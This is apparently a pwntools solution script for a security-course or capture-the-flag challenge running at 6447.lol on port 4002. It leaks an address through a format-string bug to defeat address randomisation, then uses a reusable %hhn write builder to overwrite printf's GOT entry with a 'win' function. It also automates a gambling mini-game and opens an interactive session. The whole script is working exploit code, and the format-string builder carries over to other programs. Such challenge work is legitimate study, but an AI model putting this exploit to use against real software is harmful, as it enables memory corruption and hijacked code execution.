#!/usr/bin/env python3

import math
from pwn import *

HOST = "6447.lol"
PORT = 4002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    if max_size % 8 != 0:
        raise Exception('Max size must be a multiple of 8.')

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload
    
def is_perfect_square(n):
    if n < 0:
        return False
    root = int(math.isqrt(n))
    return root * root == n

def is_fibonacci(n):
    n = int(n)
    return is_perfect_square(5 * n * n + 4) or is_perfect_square(5 * n * n - 4)

def gamble(amount=1):
    P.recvuntil(b': ', drop=True)
    P.sendline(f"{amount}".encode())
    log.info(f'Gambling ${amount}...')

    P.recvuntil(b'1) ', drop=True)
    one = int(P.recvline().strip())  
    log.info(f'[1] : {one}')

    P.recvuntil(b'2) ', drop=True)
    two = int(P.recvline().strip())  
    log.info(f'[2] : {two}')

    P.recvuntil(b'3) ', drop=True)
    three = int(P.recvline().strip()) 
    log.info(f'[3] : {three}')

    P.recvuntil(b'4) ', drop=True)
    four = int(P.recvline().strip()) 
    log.info(f'[4] : {four}')

    P.recvuntil(b'5) ', drop=True)
    five = int(P.recvline().strip()) 
    log.info(f'[5] : {five}')
    
    if not is_fibonacci(one):
        P.sendline(b"1")
        log.info(f'Selected [1] : {one}')
    elif not is_fibonacci(two):
        P.sendline(b"2")
        log.info(f'Selected [1] : {two}')
    elif not is_fibonacci(three):
        P.sendline(b"3")
        log.info(f'Selected [3] : {three}')
    elif not is_fibonacci(four):
        P.sendline(b"4")
        log.info(f'Selected [4] : {four}')
    else:
        P.sendline(b"5")
        log.info(f'Selected [5] : {five}')
   
def find_offset(after = b'?\n', option = 2):
    with context.local(log_level='error'):
        for i in range(1, 500):
            connect_binary()

            P.sendlineafter(after, f'AAAABBBB%{i}$p'.encode())
            P.sendlineafter(b'What will you do?\n', b'g')
            gamble()
            leak = P.recvuntil(b'!',drop=True)[14+8:]
            if leak == b'0x4242424241414141':
                if option == 1:
                    return i
                else:
                    print('{}: {}'.format(i, leak.strip().decode('utf-8')))

            P.close()
   
def exploit():
    payload = b'%8$p'
    P.sendlineafter(b'?\n', payload)
    P.sendlineafter(b'What will you do?\n', b'g')
    
    gamble()

    leak = P.recvuntil(b'!',drop=True)[14:]
    log.info(f"Leaked: {leak}")
    P.recvuntil(b'continue...\n', drop=True)

    E.address = (int(leak, 16) - 24) - E.symbols['g_player']
    target = E.got['printf']
    win = E.symbols['win']

    # # Alternatively,
    # base = int(leak, 16) - 0xd8 - 0x1e08        # try 0xd8 or 459
    # win = base + 0x1219                         # win function
    # target = base + 0x4258                      # printf GOT

    log.info(f"TARGET function address: {hex(target)}")
    log.info(f"WIN function address: {hex(win)}")

    payload = build_format_string(target, win, 8)
    log.info(f"Payload: {payload}")
    
    P.sendline()
    P.sendlineafter(b'What will you do?\n', b'c')
    P.sendlineafter(b'handle?\n', payload)
    P.sendlineafter(b'What will you do?\n', b'g')

    gamble()

    P.interactive()
    
if __name__ == '__main__':
    # find_offset()
    connect_binary()
    exploit()
